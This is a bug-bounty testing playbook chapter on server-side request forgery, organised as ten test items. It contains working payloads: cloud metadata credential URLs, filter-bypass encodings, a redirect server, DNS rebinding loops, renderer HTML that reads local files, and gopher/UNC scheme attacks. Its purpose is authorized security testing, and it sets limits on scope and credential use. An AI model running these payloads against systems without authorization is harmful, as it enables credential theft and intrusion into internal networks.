# SSR · Server-side request forgery

> The server makes a request to a destination you choose. It pays when you can read the response from something
> the internet cannot reach (cloud metadata, an internal admin API, a loopback service) or when the request
> carries the server's own credentials. A DNS lookup or a bare HTTP callback from the target is a primitive, not
> a finding, on most programmes.

| | |
|---|---|
| **Class** | `ssrf` |
| **Applies when** | http, app\|api |
| **Pays** | 365 disclosed reports, 112 paid, median $714, top $25,000. The best-paid ones read a response from an internal service or cloud metadata through an import, webhook, preview or render feature. |
| **Weaknesses** | Server-Side Request Forgery (SSRF) · CWE-918 |

## Why it pays

Every product that integrates with the outside world fetches URLs: webhooks, "import from URL", link previews,
avatars, PDF and screenshot rendering, feed readers, OAuth and SAML metadata discovery, repository mirroring.
Each of those is a client the developer wrote in a hurry, running inside the network perimeter. The payout
follows what you can reach and whether you can read the answer: full-response SSRF to cloud metadata with usable
credentials is critical (#923132), full-read SSRF to internal hosts is high (#1406938, #1409727), blind SSRF with
proof of internal reach is medium (#1960765), and a callback alone is usually informative.

The class is also where filters fail in repeatable ways: the allow-list checks the URL string while the HTTP
client follows a redirect, the resolver is asked twice, or a parser disagreement lets `http://allowed@internal/`
through. Most paid reports in `kb/reports/ssrf.md` are one of those four shapes.

## The crux question

**Which features make the server send a request whose destination, or any part of whose destination, comes from
me, and can I see what comes back?**

## Applicability probe

Settle `url-fetch` and `render` for the asset before opening any item.

```bash
# 1. Parameters whose value is a URL, host or path to a remote resource, from the crawl and proxy history
grep -iEo '[?&"]((callback|webhook|hook|url|uri|link|src|source|dest|target|feed|rss|import|fetch|proxy|image|img|avatar|icon|logo|file|document|doc|pdf|html|endpoint|host|domain|site|page|preview|remote|open|load|from|next)[a-z_]*)["=]' \
  "$E/recon/$H/"*.txt | sort | uniq -c | sort -rn | head -40
# 2. Request bodies and JS that already carry URLs
grep -rEho '"[a-zA-Z_]*(url|uri|link|href|webhook|callback|endpoint)[a-zA-Z_]*"\s*:' "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -40
```

Then walk the authenticated app once looking for: webhooks and integrations, import/export, "add by link",
profile picture from URL, link unfurling in comments or chat, PDF/invoice/report download, SSO or OIDC
configuration, custom domains, repository or feed sync, file upload of formats that reference external resources
(SVG, HTML, DOCX, M3U8, XML).

```bash
scripts/sane fact set "$H" url-fetch=1 --ev "webhook URL field in /settings/integrations; link preview in comments"
scripts/sane fact set "$H" render=1    --ev "invoice PDF built from the organisation name"
# nothing found after the walk:
scripts/sane fact set "$H" url-fetch=0 render=0 --ev "walked all settings and editors authenticated; no URL-valued parameter, no PDF/preview feature"
```

With both false the chapter closes for the asset; the planner writes the reason.

## Triage order

SSR-001 (find every fetcher, confirm with a callback) → SSR-002 (is the response returned?) → SSR-003 (cloud
metadata) → SSR-004 (redirect bypass) → SSR-005 (address-encoding and parser bypasses) → SSR-007 (render-based)
→ SSR-008 (file formats) → SSR-006 (DNS rebinding) → SSR-009 (other schemes) → SSR-010 (blind internal mapping).

## Items

### SSR-001 · A URL-taking feature makes the server request an attacker-chosen external host

| | |
|---|---|
| **Severity** | None standalone; the entry primitive for every other item |
| **Requires** | url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #2301565, #1960765, #398799 |

- **Where:** every parameter and feature the applicability probe listed. One row per fetcher in
  `$E/evidence/$H/SSR-001/fetchers.md`: feature, request, parameter, when the fetch fires (immediately, on save,
  on a schedule, when another user views it).
- **Test:** set the value to a unique URL on the callback host and watch for the request. Record the source IP,
  User-Agent and headers the server sends: they identify the HTTP client and whether it follows redirects.
- **How:**
  ```bash
  curl -sS "${HDR[@]}" $A -X POST "$T/api/webhooks" -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://ssr001-webhook.$OOB/x\"}" -D- -o /dev/null
  # trigger the feature (send a test event, open the preview), then read the interactsh log
  ```
- **Proof:** an HTTP request from the target's address space arriving at `ssr001-<feature>.$OOB`, with its
  headers saved. This proves the fetcher exists; it is not yet a vulnerability.
- **Not a finding when:** the callback is all you have. A webhook that calls external URLs is the feature. A DNS
  lookup without an HTTP request often comes from a mail or URL scanner, not from the application. A request from
  a third-party proxy service (an image proxy, a link-preview vendor) means the fetch does not happen inside the
  target's network.
- **Escalate:** SSR-002 to SSR-005 for each fetcher that calls back. Note the client: `python-requests`, `Go-http-client`,
  `curl`, `Java`, headless Chrome (go to SSR-007).

### SSR-002 · The fetcher returns the response body or a distinguishable error to the attacker

| | |
|---|---|
| **Severity** | None standalone; decides whether later items are full-read (high and up) or blind (medium) |
| **Requires** | url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #1406938, #1409727, #826097 |

- **Where:** each fetcher confirmed in SSR-001.
- **Test:** serve a known body from your host and find where it surfaces: the API response, an imported
  document, a stored image, a preview card, an error message, a delivery log. Then measure the blind channels:
  status-code echo, response-length echo, timing difference between open and closed ports.
- **How:**
  ```bash
  # serve a marker (python3 -m http.server on the OOB box) and point the fetcher at it
  curl -sS "${HDR[@]}" $A "$T/api/preview?url=http://$OOB/marker-ssr002.txt" | grep -a 'marker-ssr002'
  # error oracle: closed port, open port, non-HTTP port
  for u in "http://$OOB:81/" "http://$OOB:80/" "http://$OOB:22/"; do
    curl -sS "${HDR[@]}" $A -o /dev/null -w "%{http_code} %{size_download} %{time_total} $u\n" "$T/api/preview?url=$u"; done
  ```
- **Proof:** your marker text in a response the attacker can read (full-read), or a table showing three distinct
  outcomes for open, closed and filtered destinations (blind with an oracle).
- **Not a finding when:** the body only reaches the attacker after a content check that internal targets cannot
  pass (must be a valid image with matching magic bytes and the pixels are re-encoded). Record it as blind.
- **Escalate:** full-read goes straight to SSR-003. Blind goes to SSR-003 with the oracle, then SSR-010.

### SSR-003 · The fetcher reaches the cloud metadata service or a loopback service

| | |
|---|---|
| **Severity** | Critical when instance credentials or secrets are returned; High for full-read of internal services; Medium for blind reach with an oracle |
| **Requires** | url-fetch |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #923132, #2262382, #333419 |

- **Where:** each fetcher from SSR-001. Identify the cloud first: the asset's IP range, `Server` and `x-amz-*` /
  `x-goog-*` / `x-ms-*` headers, bucket host names in the page.
- **Test:** request the metadata endpoint for that cloud and the loopback admin ports of the stack. Stop at
  proof: read the role or instance identity, never use the credentials.
- **How:**
  ```bash
  P="$T/api/preview?url="
  for u in \
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
    'http://169.254.169.254/latest/dynamic/instance-identity/document' \
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' \
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
    'http://169.254.170.2/v2/credentials' \
    'http://127.0.0.1:80/' 'http://localhost:8080/actuator/env' 'http://127.0.0.1:9200/_cat/indices' \
    'http://127.0.0.1:2375/version' 'http://127.0.0.1:6379/' 'http://127.0.0.1:8500/v1/agent/self'; do
    printf '%s -> ' "$u"; curl -sS "${HDR[@]}" $A -o "$E/evidence/$H/SSR-003/$(echo "$u" | md5sum | cut -c1-8).bin" \
      -w '%{http_code} %{size_download} %{time_total}\n' --get --data-urlencode "url=$u" "$T/api/preview"; done
  ```
  GCP and Azure need a request header (`Metadata-Flavor: Google`, `Metadata: true`); they are reachable only when
  the fetcher lets you set headers, through a CRLF in the URL (chain with `crlf`), or through GCP's legacy
  `v1beta1` path where it is still enabled. AWS IMDSv2 needs a `PUT` with a header first, so a GET-only fetcher
  reaches IMDSv1 only.
- **Proof:** the role name or instance identity document in a response, saved raw. For credentials, show the
  `AccessKeyId` with the secret redacted and the `Expiration` field. For blind, the oracle table from SSR-002
  showing the metadata address behaves as "open" while an unrouted address behaves as "closed".
- **Not a finding when:** the response is the fetcher's own error page, a 403 from IMDSv2, or the request went out
  through an egress proxy that answers for every address. Compare with a request to an address that cannot exist
  (`http://10.255.255.1:9/`).
- **Escalate:** say in the report exactly what the credentials can do according to the role name, and stop.
  Using cloud credentials beyond `sts get-caller-identity` is out of bounds unless the policy says otherwise.

### SSR-004 · An allow-listed or public first URL redirects the fetcher to an internal address

| | |
|---|---|
| **Severity** | High standalone when the bypass yields a full read; Critical with metadata credentials; Medium when blind (the bypass inherits the reach proven as in SSR-003) |
| **Requires** | url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #826361, #446593, #855276 |

- **Where:** fetchers that reject `http://169.254.169.254/` or `http://127.0.0.1/` when given directly.
- **Test:** the filter validates the URL it was given; the HTTP client then follows a 30x to a destination nobody
  validated. Try 301, 302, 303, 307 and 308 (307 and 308 keep the method and body), and a redirect that changes
  scheme (`http` to `gopher`, `file` or `dict` where the client is curl-based).
- **How:**
  ```bash
  # on the OOB host: a redirector that answers every path with Location taken from the query string
  python3 - <<'PY'
  import http.server, urllib.parse
  class R(http.server.BaseHTTPRequestHandler):
      def do_GET(self):
          q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
          self.send_response(int(q.get('c', ['302'])[0])); self.send_header('Location', q['to'][0]); self.end_headers()
      do_POST = do_HEAD = do_GET
  http.server.HTTPServer(('0.0.0.0', 8000), R).serve_forever()
  PY
  curl -sS "${HDR[@]}" $A --get --data-urlencode \
    "url=http://$OOB:8000/r?c=302&to=http://169.254.169.254/latest/meta-data/" "$T/api/preview"
  ```
- **Proof:** the internal response (or the SSR-002 oracle) obtained through the redirect, next to the direct
  request being refused.
- **Not a finding when:** the client re-validates each hop (the redirect is fetched and the second request is
  refused: you see the hit on your redirector and the same error as the direct attempt).
- **Escalate:** an open redirect on an allow-listed host of the target itself does the same job when only the
  target's own domains are allowed: chain with RDR items.

### SSR-005 · The destination filter is bypassed by address encoding or URL-parser disagreement

| | |
|---|---|
| **Severity** | High standalone when the bypass yields a full read; Critical with metadata credentials; Medium when blind |
| **Requires** | url-fetch |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #2429894, #997926, #265050 |

- **Where:** fetchers with a deny-list (internal ranges blocked) or an allow-list (only certain hosts permitted).
- **Test:** the validator and the HTTP client parse the same string differently. Against deny-lists: alternative
  encodings of the address. Against allow-lists: put the allowed host where the validator looks and the real
  destination where the client connects.
- **How:**
  ```text
  deny-list:   http://2130706433/  http://0x7f000001/  http://0177.0.0.1/  http://127.1/  http://0/
               http://[::1]/  http://[::ffff:169.254.169.254]/  http://[0:0:0:0:0:ffff:a9fe:a9fe]/
               http://169.254.169.254.nip.io/  http://localtest.me/  http://①②⑦.⓪.⓪.①/
               a DNS name you control with an A record of 127.0.0.1 or 169.254.169.254
  allow-list:  http://allowed.com@169.254.169.254/   http://169.254.169.254#@allowed.com/
               http://169.254.169.254\@allowed.com/  http://allowed.com.$OOB/  http://allowed.com%2523@$OOB/
               http://$OOB/?allowed.com   http://$OOB/allowed.com   http://allowed.com:80@$OOB/
               http://allowed.com%09@$OOB/  http://allowed.com&@$OOB/  http:///169.254.169.254/  http:169.254.169.254
  ```
  Send them through the same request as SSR-003 with a loop; keep the response of each.
- **Proof:** one encoding that returns the internal response or flips the oracle, next to the canonical form being
  refused.
- **Not a finding when:** the server resolves the name, checks the resolved address against private ranges and
  connects to that same address (correct design). You will see every encoding refused with the same error.
- **Escalate:** when the filter resolves and then the client resolves again, go to SSR-006.

### SSR-006 · The filter resolves the host once and the client resolves it again (DNS rebinding)

| | |
|---|---|
| **Severity** | High standalone when the bypass yields a full read; Critical with metadata credentials; Medium when blind |
| **Requires** | url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Time-of-check Time-of-use (TOCTOU) Race Condition · CWE-367 |
| **Prior art** | #2429894, #1960765 |

- **Where:** fetchers where SSR-004 and SSR-005 all fail and the error shows a resolve-then-check design ("host
  resolves to a private address").
- **Test:** a DNS name that answers with a public address on the first lookup and an internal one on the second,
  with TTL 0.
- **How:** use a rebinding service you run or a public one (`<hex-a>.<hex-b>.rbndr.us` alternates between two
  addresses; `make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms`). Send the request 20 to 50 times at the engagement
  rate; the race is probabilistic.
  ```bash
  for i in $(seq 1 40); do curl -sS "${HDR[@]}" $A --get --data-urlencode \
    "url=http://7f000001.$(printf '%02x%02x%02x%02x' 93 184 216 34).rbndr.us/" "$T/api/preview" \
    -o "$E/evidence/$H/SSR-006/$i.bin" -w '%{http_code} %{size_download}\n'; sleep 1; done | sort | uniq -c
  ```
- **Proof:** at least one response containing internal content, reproducible within a stated number of attempts.
- **Not a finding when:** the client pins the checked address for the connection (no attempt ever succeeds in a
  few hundred tries), or a caching resolver ignores TTL 0.
- **Escalate:** as SSR-003.

### SSR-007 · Server-side rendering of attacker HTML fetches internal resources or local files

| | |
|---|---|
| **Severity** | High for internal or local file read; Critical with metadata credentials |
| **Requires** | render |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #1628209, #811136, #892049 |

- **Where:** PDF invoices and reports, "export as PDF/PNG", e-mail previews, social-card generators: any feature
  that turns a field you control into a rendered document.
- **Test:** inject markup into the field. If HTML is interpreted, the renderer (headless Chrome, wkhtmltopdf,
  PhantomJS, WeasyPrint) will load sub-resources from inside the network, and often from `file://`.
- **How:**
  ```html
  <!-- step 1: is markup interpreted? -->
  <b>ssr007</b><img src="http://ssr007.OOB/img">
  <!-- step 2: read through the renderer -->
  <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="900" height="600"></iframe>
  <iframe src="file:///etc/hostname"></iframe>
  <script>x=new XMLHttpRequest;x.open('GET','file:///etc/passwd',false);x.send();document.write('<pre>'+x.responseText+'</pre>')</script>
  <link rel="attachment" href="file:///etc/hostname">   <!-- WeasyPrint: embedded in the PDF as an attachment -->
  ```
  Read the producer from the PDF (`pdfinfo out.pdf`, `strings out.pdf | grep -i -E 'producer|creator'`) to pick
  the technique.
- **Proof:** the rendered document containing internal or local content, attached, plus the request that created
  it.
- **Not a finding when:** the markup is escaped in the output (the tags appear as text), or the renderer runs in a
  sandbox with no network and no file access (the frames are empty and no callback arrives).
- **Escalate:** JavaScript execution in the renderer makes the oracle from SSR-002 unnecessary: script can read
  responses and write them into the page.

### SSR-008 · An uploaded or imported file format makes the server fetch a URL

| | |
|---|---|
| **Severity** | High for full-read; Medium for blind with internal reach |
| **Requires** | upload\|url-fetch, file-processing, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #1062888, #671935, #347139 |

- **Where:** uploads that are converted, thumbnailed, previewed or parsed: images (SVG, with ImageMagick or
  librsvg behind it), video and playlists (FFmpeg HLS), office documents (LibreOffice), XML-based formats.
- **Test:** embed an external reference in the file and watch for the callback, then point it at an internal
  address and look for the content in the converted output.
- **How:**
  ```bash
  cat > ssr008.svg <<EOF
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="400">
    <image xlink:href="http://ssr008-svg.$OOB/i.png" width="400" height="400"/></svg>
  EOF
  printf '#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://ssr008-hls.%s/seg.ts\n#EXT-X-ENDLIST\n' "$OOB" > ssr008.m3u8
  # DOCX/XLSX/ODT: add an external image or an INCLUDEPICTURE field pointing at http://ssr008-doc.$OOB/
  curl -sS "${HDR[@]}" $A -F "file=@ssr008.svg;type=image/svg+xml" "$T/api/upload"
  ```
- **Proof:** the callback identifying the converter (User-Agent `ImageMagick`, `Lavf`, `LibreOffice`), then a
  converted file or preview that contains bytes from an internal URL.
- **Not a finding when:** the fetch comes from the victim's browser when they view the file (that is a tracking
  pixel, at most low), not from the server.
- **Escalate:** converter fetches are frequently also local-file reads: LFI and XXE chapters; FFmpeg and
  ImageMagick have their own CVE history: CVE chapter.

### SSR-009 · The fetcher accepts non-HTTP schemes

| | |
|---|---|
| **Severity** | High to Critical when `file://` reads local files or `gopher://` reaches an unauthenticated internal service |
| **Requires** | url-fetch |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #288353, #746024, #512973 |

- **Where:** fetchers whose client is curl/libcurl, PHP streams, Java `URL`, or Python `urllib` (identified from
  the SSR-001 User-Agent).
- **Test:** try each scheme the client library supports and compare errors.
- **How:**
  ```text
  file:///etc/hostname     file://localhost/etc/hostname     file:///c:/windows/win.ini
  dict://127.0.0.1:6379/INFO          gopher://127.0.0.1:6379/_INFO%0d%0a
  ftp://OOB/x     sftp://OOB:22/x     ldap://OOB/x     tftp://OOB/x
  php://filter/convert.base64-encode/resource=index.php      jar:http://OOB/x.jar!/      netdoc:///etc/hostname
  \\OOB\share\x   (Windows back end: UNC path, leaks an NTLM handshake to your SMB listener)
  ```
- **Proof:** local file content or an internal service's banner in the response; for UNC, the captured NTLMv2
  handshake with the hash truncated.
- **Not a finding when:** the scheme is rejected before any connection (same error for every non-HTTP scheme and
  no callback on the ones that would reach you).
- **Escalate:** `gopher://` to Redis, Memcached, FastCGI or an internal SMTP relay is a path to code execution.
  Prove reach with a read-only command (`INFO`, `stats`) and stop: writing keys or cron entries is destructive.

### SSR-010 · A blind fetcher is used to map internal hosts and ports

| | |
|---|---|
| **Severity** | Medium with a reliable oracle and at least one identified internal service; Low without |
| **Requires** | url-fetch, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #1960765, #893856, #907819 |

- **Where:** blind fetchers with the status, length or timing oracle measured in SSR-002.
- **Test:** show that the fetch originates inside the perimeter and distinguishes live internal services, using a
  small, justified target list: loopback, the instance's own subnet gateway, and well-known internal names from
  the recon (hosts seen in certificates, error messages or JS).
- **How:**
  ```bash
  for p in 22 80 443 2375 3306 5432 6379 8080 8500 9200 11211 27017; do
    curl -sS "${HDR[@]}" $A -o /dev/null -w "$p %{http_code} %{size_download} %{time_total}\n" \
      --get --data-urlencode "url=http://127.0.0.1:$p/" "$T/api/preview"; sleep 1; done | tee "$E/evidence/$H/SSR-010/loopback.txt"
  ```
  Keep it to a few dozen requests. A sweep of a /16 is a port scan of someone's internal network and is neither
  necessary for the report nor inside most policies.
- **Proof:** the oracle table: destinations, the three measurements, and the classification, with a control row
  for an address that cannot exist.
- **Not a finding when:** every destination produces the same status, size and timing within noise.
- **Escalate:** an identified internal HTTP service plus SSR-004 or SSR-005 may turn blind into full-read; an
  internal service with a known unauthenticated GET-triggered action (Consul, Docker, Jenkins script console
  behind SSO) raises the ceiling, but only prove what a read-only request can show.

## Graveyard

- **External callback only.** "The server made a request to my Burp Collaborator" on a webhook, link preview or
  import feature is the feature working. Closed informative unless an internal destination is shown.
- **DNS-only interaction.** A lookup without an HTTP request, usually from a security scanner or mail gateway.
- **SSRF through a third-party proxy.** The request leaves from an image-proxy or preview vendor's network; the
  target's internal network was never reachable (`third-party`).
- **Blind SSRF with no oracle.** Programmes rate it low or informative; say so in the note and park it.
- **Client-side fetches.** The victim's browser loads your URL. That is not SSRF.
- **Internal port scan as the impact.** A list of open ports on 127.0.0.1 without an identified service or a read
  is medium at best and often low.

## Chains

- RDR (open redirect on an allow-listed host) → SSR-004: bypasses host allow-lists.
- CRL (CRLF in the fetched URL or a header parameter) → SSR-003: adds the `Metadata-Flavor` or `X-aws-ec2-metadata-token` header.
- XXE and UPL (SVG, DOCX) → SSR-008: file formats as the fetch trigger.
- SSR-003 → CLD items: what the metadata credentials expose (describe, do not use).
- SSR-009 `gopher://` → RCE items: unauthenticated internal Redis, FastCGI, Docker API.
- HHI (Host header routed to an internal virtual host) is SSRF at the reverse proxy: see the host-header chapter.

## Sources

- `kb/reports/ssrf.md` and `kb/reports/all/ssrf.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"SSRF"}`, `find_bypasses {"protection":"ssrf allow-list"}`, `find_payloads {"topic":"Server Side Request Forgery"}`.
- PortSwigger Web Security Academy, SSRF; OWASP WSTG-INPV-19; PayloadsAllTheThings, Server Side Request Forgery.
- Orange Tsai, "A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages" (2017).
